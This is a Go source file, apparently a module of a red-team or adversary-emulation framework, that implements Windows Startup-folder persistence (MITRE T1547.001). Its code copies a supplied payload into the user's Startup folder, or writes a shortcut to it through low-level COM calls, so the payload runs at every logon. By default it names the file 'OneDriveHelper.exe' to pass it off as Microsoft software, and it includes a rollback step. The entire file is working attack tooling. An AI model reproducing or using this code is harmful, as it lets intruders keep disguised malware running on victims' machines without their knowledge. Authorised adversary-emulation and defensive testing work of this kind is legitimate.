package persistence

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// StartupFolder copies the payload (or writes a .lnk shortcut) into the
// user's Startup folder so Windows auto-launches it on logon.
// MITRE T1547.001.
type StartupFolder struct {
	PayloadPath string // required: source binary
	DropName    string // default: "OneDriveHelper.exe" or .lnk
	UseLNK      bool   // write a .lnk pointing at PayloadPath instead of copying
}

func (s *StartupFolder) Name() string { return "startup-folder" }
func (s *StartupFolder) ID() string   { return "T1547.001" }

func (s *StartupFolder) dropName() string {
	if s.DropName != "" {
		return s.DropName
	}
	if s.UseLNK {
		return "OneDriveHelper.lnk"
	}
	return "OneDriveHelper.exe"
}

func startupDir() (string, error) {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return "", fmt.Errorf("%%APPDATA%% not set")
	}
	return filepath.Join(appdata, `Microsoft\Windows\Start Menu\Programs\Startup`), nil
}

func (s *StartupFolder) destPath() (string, error) {
	dir, err := startupDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(dir, s.dropName()), nil
}

func (s *StartupFolder) Run() error {
	if s.PayloadPath == "" {
		return fmt.Errorf("PayloadPath is required")
	}
	if s.UseLNK {
		lnkPath, err := s.destPath()
		if err != nil {
			return err
		}
		return writeLNK(lnkPath, s.PayloadPath)
	}
	return s.runCopy()
}

func (s *StartupFolder) runCopy() error {
	dst, err := s.destPath()
	if err != nil {
		return err
	}
	src, err := os.Open(s.PayloadPath)
	if err != nil {
		return fmt.Errorf("open: %w", err)
	}
	defer src.Close()
	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("create: %w", err)
	}
	defer out.Close()
	_, err = io.Copy(out, src)
	return err
}

func (s *StartupFolder) Rollback() error {
	dst, err := s.destPath()
	if err != nil {
		return err
	}
	if err := os.Remove(dst); err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

// --- IShellLinkW COM helpers ---

var (
	ole32                = syscall.NewLazyDLL("ole32.dll")
	procCoInitialize     = ole32.NewProc("CoInitialize")
	procCoCreateInstance = ole32.NewProc("CoCreateInstance")
	procCoUninitialize   = ole32.NewProc("CoUninitialize")
)

var (
	clsidShellLink = syscall.GUID{
		Data1: 0x00021401, Data4: [8]byte{0xC0, 0, 0, 0, 0, 0, 0, 0x46},
	}
	iidShellLinkW = syscall.GUID{
		Data1: 0x000214F9, Data4: [8]byte{0xC0, 0, 0, 0, 0, 0, 0, 0x46},
	}
	iidPersistFile = syscall.GUID{
		Data1: 0x0000010B, Data4: [8]byte{0xC0, 0, 0, 0, 0, 0, 0, 0x46},
	}
)

type shellLinkVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	_              [17]uintptr
	SetPath        uintptr // index 20
}

type shellLink struct{ vtbl *shellLinkVtbl }

type persistFileVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	_              [2]uintptr
	Load           uintptr
	Save           uintptr
}

type persistFile struct{ vtbl *persistFileVtbl }

func writeLNK(lnkPath, target string) error {
	procCoInitialize.Call(0)
	defer procCoUninitialize.Call()

	var sl *shellLink
	hr, _, _ := procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidShellLink)),
		0, 1,
		uintptr(unsafe.Pointer(&iidShellLinkW)),
		uintptr(unsafe.Pointer(&sl)),
	)
	if hr != 0 {
		return fmt.Errorf("CoCreateInstance: 0x%x", hr)
	}
	defer syscall.SyscallN(sl.vtbl.Release, uintptr(unsafe.Pointer(sl)))

	targetW, _ := syscall.UTF16PtrFromString(target)
	hr, _, _ = syscall.SyscallN(
		sl.vtbl.SetPath,
		uintptr(unsafe.Pointer(sl)),
		uintptr(unsafe.Pointer(targetW)),
	)
	if hr != 0 {
		return fmt.Errorf("SetPath: 0x%x", hr)
	}

	var pf *persistFile
	hr, _, _ = syscall.SyscallN(
		sl.vtbl.QueryInterface,
		uintptr(unsafe.Pointer(sl)),
		uintptr(unsafe.Pointer(&iidPersistFile)),
		uintptr(unsafe.Pointer(&pf)),
	)
	if hr != 0 {
		return fmt.Errorf("QI IPersistFile: 0x%x", hr)
	}
	defer syscall.SyscallN(pf.vtbl.Release, uintptr(unsafe.Pointer(pf)))

	pathW, _ := syscall.UTF16PtrFromString(lnkPath)
	hr, _, _ = syscall.SyscallN(
		pf.vtbl.Save,
		uintptr(unsafe.Pointer(pf)),
		uintptr(unsafe.Pointer(pathW)),
		1,
	)
	if hr != 0 {
		return fmt.Errorf("Save: 0x%x", hr)
	}
	return nil
}
